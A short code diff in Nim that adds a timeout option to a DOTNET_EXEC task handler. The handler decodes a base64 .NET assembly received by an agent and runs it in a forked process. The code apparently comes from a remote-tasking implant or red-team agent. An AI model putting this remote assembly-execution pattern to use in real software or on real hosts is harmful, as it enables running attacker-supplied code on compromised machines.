@@ -2300,7 +2300,8 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
         if b64.len == 0: t.sendResult(id, "", "DOTNET_EXEC: missing asm field"); return
         let asmStr = base64.decode(b64)
         let asmArgs = j{"args"}.getStr()
-        let r = forkRunAssembly(asmStr.toOpenArrayByte(0, asmStr.high), asmArgs)
+        let timeoutSec = j{"timeout_sec"}.getInt(0)
+        let r = forkRunAssembly(asmStr.toOpenArrayByte(0, asmStr.high), asmArgs, timeoutSec)
         t.sendResult(id, r, "")
       except: t.sendResult(id, "", "dotnet_exec: " & getCurrentExceptionMsg())
     else:
